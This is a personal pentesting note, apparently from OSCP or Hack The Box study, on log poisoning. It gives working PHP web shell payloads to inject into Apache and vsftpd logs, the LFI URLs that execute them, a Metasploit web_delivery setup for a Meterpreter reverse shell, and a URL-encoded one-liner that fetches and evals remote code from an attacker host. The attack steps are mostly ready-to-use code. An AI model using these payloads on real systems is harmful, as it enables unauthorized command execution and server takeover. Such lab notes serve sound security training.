---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[log poisoning]]  
___

## Description:  

### Web sever log poisoning

Can you access `C:\xampp\apache\logs\access.log` or any other logs files? You can try to Poisoning log files. For example:
Connect to the web server with ssh and send it a php script:
```
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
HTTP/1.1 400 Bad Request
```

Next, we’ll use the LFI vulnerability to include the Apache access.log file that contains our PHP 
payload. We know the application is using an include statement so the contents of the included file 
will be executed as PHP code.
```
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```


### FTP Log Poisoning
Server must be running ftp and have a LFI vuln.
 
Connect to the ftp server and run in the name field:
`'<?php system($_GET['c']); ?>'`

Now use your LFI to access the logs of the FTP server to run commands:

add a &c=command to the end of your URL to run commands:
`http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=ifconfig`

### Metasploit shell
Use web delivery to get a shell

```
msfconsole

use exploit/multi/handler

use exploit/multi/script/web_delivery

set target 1

set payload php/meterpreter/reverse_tcp

set uripath /

set srvhost 10.10.14.79

set lhost 10.10.14.79

run
```

Copy and paste the command in msfconsole in your web browser:
`php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.10.14.79:8080/', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"`

`http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://10.10.14.79:8080/%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22`

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (03:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
